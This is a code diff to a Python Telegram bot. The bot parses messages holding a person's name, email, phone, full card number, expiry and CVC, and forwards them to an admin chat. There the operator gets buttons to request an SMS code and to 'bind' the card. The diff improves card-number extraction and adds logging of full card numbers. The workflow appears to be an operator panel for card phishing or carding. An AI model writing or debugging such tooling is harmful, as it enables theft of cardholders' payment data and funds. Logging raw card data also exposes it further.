@@ -323,6 +323,8 @@ def extract_card_number(text):
 
 # Инлайн кнопки для платежей
 def get_payment_buttons(payment_id, user_id="user123", card_number=None):
+    logger.info(f"🔍 ДЕБАГ get_payment_buttons: card_number={card_number}")
+    
     buttons = [
         [
             InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_{payment_id}_{user_id}"),
@@ -330,11 +332,14 @@ def get_payment_buttons(payment_id, user_id="user123", card_number=None):
         ]
     ]
     
-    # УПРОЩАЕМ: Показываем "Привязать" если есть номер карты (даже если он уже в базе)
-    if card_number and card_number.strip():  # Проверяем что не None и не пустая строка
+    # ВСЕГДА показываем кнопку "Привязать" если есть хоть какой-то номер карты
+    if card_number and card_number.strip() and card_number != "НЕ ИЗВЛЕЧЕНО":
         buttons.append([
             InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind_{payment_id}_{user_id}_{card_number}")
         ])
+        logger.info(f"🔍 ДЕБАГ: Кнопка ПРИВЯЗАТЬ добавлена для {card_number}")
+    else:
+        logger.info(f"🔍 ДЕБАГ: card_number не подходит для кнопки: {card_number}")
     
     buttons.append([
         InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
@@ -607,13 +612,24 @@ async def handle_admin_messages(message: types.Message):
 
 async def process_payment_data(message: types.Message):
     try:
+        logger.info(f"🔍 ДЕБАГ: Начало обработки платежных данных")
+        
         lines = message.text.split('\n')
         payment_data = {}
-        card_number = None  # Явно инициализируем
+        card_number = None
 
+        # Детально разбираем каждую строку
         for line in lines:
             line = line.strip()
-            if 'Имя:' in line:
+            logger.info(f"🔍 ДЕБАГ Строка: {line}")
+            
+            if 'Номер:' in line:
+                card_number = line.split('Номер:')[1].strip()
+                logger.info(f"🔍 ДЕБАГ Найден номер (формат 1): {card_number}")
+            elif '• Номер:' in line:
+                card_number = line.split('• Номер:')[1].strip()
+                logger.info(f"🔍 ДЕБАГ Найден номер (формат 2): {card_number}")
+            elif 'Имя:' in line:
                 payment_data['first_name'] = line.split('Имя:')[1].strip()
             elif 'Фамилия:' in line:
                 payment_data['last_name'] = line.split('Фамилия:')[1].strip()
@@ -621,25 +637,20 @@ async def process_payment_data(message: types.Message):
                 payment_data['email'] = line.split('Email:')[1].strip()
             elif 'Телефон:' in line:
                 payment_data['phone'] = line.split('Телефон:')[1].strip()
-            elif 'Номер:' in line:
-                card_number = line.split('Номер:')[1].strip()  # Сохраняем в отдельную переменную
-                payment_data['card_number'] = card_number
             elif 'Срок:' in line:
                 payment_data['card_expiry'] = line.split('Срок:')[1].strip()
             elif 'CVC:' in line:
                 payment_data['cvc'] = line.split('CVC:')[1].strip()
 
-        # ДЕБАГ: Проверяем что извлекли
-        logger.info(f"🔍 Извлеченный номер карты: {card_number}")
-        
-        # Если номер карты не извлекся, пробуем альтернативный формат
+        logger.info(f"🔍 ДЕБАГ Итоговый card_number: {card_number}")
+
+        # Если номер карты не нашелся, пробуем найти в другом формате
         if not card_number:
             for line in lines:
-                if '• Номер:' in line:
-                    card_number = line.split('• Номер:')[1].strip()
+                if 'Номер' in line and ':' in line:
+                    card_number = line.split(':')[1].strip()
+                    logger.info(f"🔍 ДЕБАГ Найден номер (универсальный): {card_number}")
                     break
-
-        logger.info(f"🔍 Финальный номер карты: {card_number}")
 
         # СОЗДАЕМ ПЛАТЕЖ
         payment_id = save_payment(
@@ -653,29 +664,34 @@ async def process_payment_data(message: types.Message):
             cvc=payment_data.get('cvc', '')
         )
 
-        if payment_id and card_number:  # Убеждаемся что номер карты есть
-            # Форматируем сообщение
-            formatted_text = f"💳 <b>НОВАЯ КАРТА ДЛЯ ПРИВЯЗКИ</b>\n\n"
+        if payment_id:
+            # ВАЖНО: Всегда передаем card_number, даже если None
+            logger.info(f"🔍 ДЕБАГ Передаем в кнопки: card_number={card_number}")
+            
+            formatted_text = f"💳 <b>НОВЫЙ ПЛАТЕЖ #{payment_id}</b>\n\n"
             formatted_text += "👤 <b>Клиент:</b>\n"
             formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
-            formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"  
+            formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
             formatted_text += f"• Email: {payment_data.get('email', '')}\n"
             formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
             formatted_text += "💳 <b>Карта:</b>\n"
-            formatted_text += f"• Номер: {card_number}\n"
+            formatted_text += f"• Номер: {card_number or 'НЕ ИЗВЛЕЧЕНО'}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "🔄 <b>Статус: Карта готова к привязке</b>\n\n"
+            formatted_text += "🔄 <b>Статус: Ожидание действий</b>\n\n"
             formatted_text += "Выберите действие:"
             
-            # ВАЖНО: Передаем card_number в функцию кнопок
+            # ВАЖНО: Всегда передаем card_number в get_payment_buttons
+            keyboard = get_payment_buttons(payment_id, "user123", card_number)
+            logger.info(f"🔍 ДЕБАГ Клавиатура создана: {keyboard}")
+            
             await bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=formatted_text,
-                reply_markup=get_payment_buttons(payment_id, "user123", card_number),
+                reply_markup=keyboard,
                 parse_mode="HTML"
             )
-            logger.info(f"✅ Платеж #{payment_id} создан с кнопкой ПРИВЯЗАТЬ")
+            logger.info(f"✅ Платеж #{payment_id} отправлен с card_number={card_number}")
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
@@ -1046,6 +1062,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
